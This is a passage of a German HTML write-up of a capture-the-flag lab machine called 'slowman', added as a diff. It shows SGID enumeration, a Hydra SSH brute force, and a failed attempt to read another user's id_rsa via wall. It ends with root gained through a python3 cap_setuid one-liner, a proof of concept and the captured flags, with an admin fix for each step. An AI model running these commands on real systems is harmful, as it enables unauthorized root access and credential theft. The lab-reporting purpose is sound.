+/bin/pastebinit:                                        permatag, title, username, password,
+/boot/grub/i386-pc/command.lst:legacy_check_password: legacycfg
+/boot/grub/i386-pc/command.lst:legacy_password: legacycfg
+/boot/grub/i386-pc/command.lst:password: password
+/boot/grub/i386-pc/command.lst:password_pbkdf2: password_pbkdf2
+/boot/grub/i386-pc/moddep.lst:password_pbkdf2: crypto pbkdf2 normal gcry_sha512
+/boot/grub/i386-pc/moddep.lst:password: crypto normal
+/boot/grub/i386-pc/moddep.lst:legacy_password_test: functional_test legacycfg
+/boot/grub/i386-pc/moddep.lst:legacycfg: gcry_md5 crypto normal password linux
+                       </pre> <!-- Gekürzte Ausgabe -->
+                    </div>
+                </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Suche nach Dateien mit gesetztem SGID-Bit (`-perm -2000`). Das SGID-Bit bewirkt, dass ein Programm mit den Gruppenrechten des Dateieigentümers ausgeführt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es wird eine Liste von Standard-Systemdateien gefunden, die das SGID-Bit gesetzt haben (z.B. `wall`, `write.ul`, `ssh-agent`, `unix_chkpwd`). Keine offensichtlich ungewöhnlichen oder benutzerdefinierten SGID-Dateien.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die gefundenen SGID-Binaries auf bekannte Schwachstellen oder Missbrauchsmöglichkeiten (GTFOBins). Konzentration weiterhin auf die Python-Capability.<br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der SGID-Binaries. Halten Sie Systemkomponenten aktuell.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/var$ <span class="command">find / -perm -2000 -type f 2>/dev/null</span></div>
+                       <pre>
+/snap/core20/2015/usr/bin/chage
+/snap/core20/2015/usr/bin/expiry
+/snap/core20/2015/usr/bin/ssh-agent
+/snap/core20/2015/usr/bin/wall
+/snap/core20/2015/usr/sbin/pam_extrausers_chkpwd
+/snap/core20/2015/usr/sbin/unix_chkpwd
+/snap/core20/1974/usr/bin/chage
+/snap/core20/1974/usr/bin/expiry
+/snap/core20/1974/usr/bin/ssh-agent
+/snap/core20/1974/usr/bin/wall
+/snap/core20/1974/usr/sbin/pam_extrausers_chkpwd
+/snap/core20/1974/usr/sbin/unix_chkpwd
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/bin/ssh-agent
+/usr/bin/wall
+/usr/bin/write.ul
+/usr/bin/expiry
+/usr/bin/chage
+/usr/bin/crontab
+/usr/sbin/pam_extrausers_chkpwd
+/usr/sbin/unix_chkpwd
+                       </pre>
+                    </div>
+                </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, das SGID-Binary `wall` zu missbrauchen, um den Inhalt einer Datei (`/home/gonzalo/.ssh/id_rsa`) über `sudo` auszugeben. `wall` kann zum Senden von Nachrichten an alle eingeloggten Benutzer verwendet werden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Versuch scheitert, da `trainerjean` keine sudo-Rechte hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieser spezifische `wall`-Exploit erfordert sudo. Andere SGID-Binaries könnten andere Ausnutzungsmethoden haben. Fokus auf Python.<br><strong>Empfehlung (Admin):</strong> Korrekte sudo-Konfiguration verhindert diesen Exploit.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/var/log$ <span class="command">cd /tmp/</span></div>
+                       <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">LFILE=/home/gonzalo/.ssh/id_rsa</span></div>
+                       <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">sudo wall --nobanner "$LFILE"</span></div>
+                       <pre>
+[sudo] password for trainerjean:
+trainerjean is not in the sudoers file.  This incident will be reported.
+                       </pre>
+                    </div>
+                </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein erneuter Hydra-Brute-Force-Angriff wird auf den SSH-Dienst gestartet, diesmal für den Benutzer `trainerjeff`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Angriff läuft, findet aber (in der gezeigten Ausgabe) kein Passwort. Es ist unklar, warum dieser Angriff erneut gestartet wird, da `trainerjeff` bereits als MySQL-Benutzer identifiziert wurde und SSH-Logins für `trainerjean` erfolgreich waren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Vermeiden Sie redundante Brute-Force-Angriffe. Konzentrieren Sie sich auf die vielversprechendsten Vektoren (Python-Capability).<br><strong>Empfehlung (Admin):</strong> Blockieren Sie Brute-Force-Angriffe mit Tools wie `fail2ban`.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l trainerjeff -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.113:22 -t 64</span></div>
+                     <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-05 23:40:24
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344484 login tries (l:1/p:14344484), ~224133 tries per task
+[DATA] attacking ssh://192.168.2.113:22/
+[STATUS] 322.00 tries/min, 322 tries in 00:01h, 14344196 to do in 742:28h, 30 active
+                     </pre> <!-- Angriff läuft noch / wurde abgebrochen -->
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, das SGID-Binary `ssh-agent` auszunutzen, um eine Shell mit geänderten Rechten zu erhalten. Zuerst direkt, dann über `sudo`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Beide Versuche scheitern. Der direkte Aufruf ändert die UID/GID nicht. Der `sudo`-Versuch scheitert, da `trainerjean` keine sudo-Rechte hat.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `ssh-agent` ist hier kein gangbarer Weg zur Eskalation. Fokus auf Python.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion erforderlich, da die Versuche fehlschlugen.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">ssh-agent /bin/sh -p</span></div>
+                       <pre>
+$ id
+uid=1002(trainerjean) gid=1002(trainerjean) groups=1002(trainerjean)
+$ exit
+                       </pre>
+                        <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">sudo -u trainerjeff ssh-agent /bin/sh</span></div>
+                        <pre>
+[sudo] password for trainerjean:
+trainerjean is not in the sudoers file.  This incident will be reported.
+                        </pre>
+                     </div>
+                 </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Überschrift "Privilege Escalation" deutet auf den nun folgenden, erfolgreichen Schritt hin.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Markiert den Übergang zum entscheidenden Exploit.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bereiten Sie den Exploit für die Python-Capability vor.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+              Privilege Escalation
+                      </pre>
+                   </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der entscheidende Befehl wird ausgeführt: `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`. Dies nutzt die `cap_setuid=ep`-Capability von `/usr/bin/python3.10`. Das Python-Skript importiert das `os`-Modul, setzt die effektive User-ID auf 0 (root) mittels `os.setuid(0)` und startet dann eine neue Shell (`/bin/sh`) mit diesen erhöhten Rechten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl ist erfolgreich! Der `id`-Befehl in der neuen Shell zeigt `uid=0(root)`, während die Gruppenmitgliedschaften noch die des ursprünglichen Benutzers (`trainerjean`) sind. Dies bedeutet, wir haben Root-Rechte erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fantastisch, der Root-Zugriff über die Python-Capability war erfolgreich! Nun haben wir unser Ziel erreicht. Sichern Sie die Root-Flag und führen Sie weitere Post-Exploitation-Aktionen durch (Persistenz, Bereinigung, weitere Datensuche).<br><strong>Empfehlung (Admin):</strong> Entfernen Sie die `cap_setuid`-Capability von `/usr/bin/python3.10` (`setcap -r /usr/bin/python3.10`). Überprüfen Sie regelmäßig Capabilities auf allen Systemdateien.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:~$ <span class="command">python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'</span></div>
+                       <div class="prompt root-prompt"># <span class="command">id</span></div>
+                       <pre>uid=0(root) gid=1002(trainerjean) groups=1002(trainerjean)</pre>
+                       <div class="prompt root-prompt"># <span class="command"></span></div>
+                     </div>
+                 </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Nach Erlangung der Root-Shell wird ins Home-Verzeichnis des vorherigen Benutzers (`~`, also `/home/trainerjean`) gewechselt und die `user.txt` erneut gelesen. Dann wird ins Root-Home-Verzeichnis (`/root`) gewechselt und dessen Inhalt aufgelistet. Schließlich wird die `root.txt` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die User-Flag und findet die Root-Flag-Datei `root.txt`. Der Inhalt der Root-Flag wird erfolgreich ausgelesen: `<span class="password">Y0UGE23t7hE515roo7664pa5$WoRDFSlowmaN!!</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beide Flags wurden erfolgreich gesichert. Der Hauptteil des Tests ist abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Sichern Sie die Flag-Dateien besser (restriktivere Berechtigungen, ungewöhnlichere Speicherorte). Beheben Sie die Ursache der Privilegieneskalation (Python-Capability).</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt root-prompt"># <span class="command">cd ~</span></div>
+                       <div class="prompt root-prompt"># <span class="command">ls</span></div>
+                       <pre>py.py  snap  user.txt</pre>
+                       <div class="prompt root-prompt"># <span class="command">cat user.txt</span></div>
+                       <pre><span class="password">YU9et7HEpA$SwordofS10wMan!!</span></pre>
+                       <div class="prompt root-prompt"># <span class="command">cd /root</span></div>
+                       <div class="prompt root-prompt"># <span class="command">ls</span></div>
+                       <pre>root.txt  snap</pre>
+                       <div class="prompt root-prompt"># <span class="command">cat root.txt</span></div>
+                       <pre><span class="password">Y0UGE23t7hE515roo7664pa5$WoRDFSlowmaN!!</span></pre>
+                       <div class="prompt root-prompt"># <span class="command"></span></div>
+                     </div>
+                 </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dies ist ein Kommentar im ursprünglichen Text, der den erfolgreichen Abschluss der Privilege Escalation markiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Erlangung von Root-Rechten wurde erfolgreich abgeschlossen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie den Weg zur Root-Erlangung klar im Bericht (was hier durch den POC und die vorherigen Schritte geschehen ist).<br><strong>Empfehlung (Admin):</strong> Fokussieren Sie sich auf die Behebung der Schwachstellen, die zur Privilegieneskalation geführt haben.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+  Privilege Escalation erfolgreich
+                     </pre>
+                 </div>
+            </div>
+        </section>
+
+         <!-- POC Section für Python Capability Exploit -->
+        <section id="proof-of-concept">
+            <h2>Proof of Concept: Ausnutzung der Python setuid-Capability</h2>
+            <p><strong>Kurzbeschreibung:</strong> Die Binärdatei `/usr/bin/python3.10` verfügt über die gesetzte Linux-Capability `cap_setuid=ep`. Diese Capability erlaubt es einem Prozess, seine eigene effektive Benutzer-ID (UID) zu ändern. Durch Ausführen eines speziell präparierten Python-Skripts kann ein Benutzer mit niedrigen Rechten (hier `trainerjean`) seine UID auf 0 (root) setzen und somit eine Root-Shell erlangen.</p>
+            <p><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Zugang zum System als Benutzer mit Ausführungsrechten für `/usr/bin/python3.10` (hier `trainerjean`).</li>
+                    <li>Die Capability `cap_setuid=ep` muss für `/usr/bin/python3.10` gesetzt sein.</li>
+                </ul>
+            </p>
+            <p><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+            <p class="analysis"><strong>Analyse Schritt 1:</strong> Überprüfen der gesetzten Capabilities für die Python-Binärdatei.</p>
+            <p class="evaluation"><strong>Bewertung Schritt 1:</strong> Der Befehl `getcap` bestätigt, dass `/usr/bin/python3.10` die `cap_setuid=ep` Capability besitzt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies bestätigt den Angriffsvektor.<br><strong>Empfehlung (Admin):</strong> Erkennen und Entfernen unnötiger Capabilities ist entscheidend.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">getcap /usr/bin/python3.10</span></div>
+                       <pre>/usr/bin/python3.10 cap_setuid=ep</pre>
+                    </div>
+                </div>
+
+            <p class="analysis"><strong>Analyse Schritt 2:</strong> Ausführen eines Python-Einzeilers, der das `os`-Modul importiert, `os.setuid(0)` aufruft, um die UID auf root zu setzen, und anschließend eine Shell (`/bin/sh`) startet.</p>
+            <p class="evaluation"><strong>Bewertung Schritt 2:</strong> Der Befehl wird erfolgreich ausgeführt. Die anschließende Überprüfung mit `id` zeigt `uid=0(root)`, was die erfolgreiche Privilegieneskalation bestätigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Exploit war erfolgreich. Sie haben nun Root-Zugriff.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie die `cap_setuid`-Capability von Python (`setcap -r /usr/bin/python3.10`).</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:~$ <span class="command">python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'</span></div>
+                       <div class="prompt root-prompt"># <span class="command">id</span></div>
+                       <pre>uid=0(root) gid=1002(trainerjean) groups=1002(trainerjean)</pre>
+                       <div class="prompt root-prompt"># <span class="command"></span></div>
+                     </div>
+                 </div>
+            <p><strong>Erwartetes Ergebnis:</strong> Erfolgreiche Erlangung einer interaktiven Shell mit root-Berechtigungen (UID=0).</p>
+            <p><strong>Beweismittel:</strong> Die Ausgabe des `id`-Befehls (`uid=0(root)`) innerhalb der durch Python gestarteten Shell.</p>
+            <p><strong>Risikobewertung:</strong> Hoch. Diese Fehlkonfiguration ermöglicht einem lokalen Benutzer die vollständige Übernahme des Systems.</p>
+            <p><strong>Empfehlungen:</strong> Entfernen Sie die `cap_setuid`-Capability von `/usr/bin/python3.10` (`setcap -r /usr/bin/python3.10`). Überprüfen Sie regelmäßig die Capabilities aller Systemdateien und wenden Sie das Prinzip der geringsten Rechte an.</p>
+        </section>
+
+
+        <section id="flags">
+             <!-- Flag-Container für Zentrierung und Styling -->
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <!-- User Flag Eintrag -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/trainerjean/user.txt</div> <!-- Befehl rekonstruiert basierend auf vorheriger Ausgabe -->
+                    <div class="flag-value"><span class="password">YU9et7HEpA$SwordofS10wMan!!</span></div>
+                </div>
+
+                <!-- Root Flag Eintrag -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div> <!-- Befehl rekonstruiert basierend auf vorheriger Ausgabe -->
+                    <div class="flag-value"><span class="password">Y0UGE23t7hE515roo7664pa5$WoRDFSlowmaN!!</span></div>
+                </div>
+            </div>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum extrahiert aus der ersten Nikto/Nmap Zeitangabe -->
+        <p>Berichtsdatum: 2023-12-04</p>
+    </footer>
+</body>
+</html>
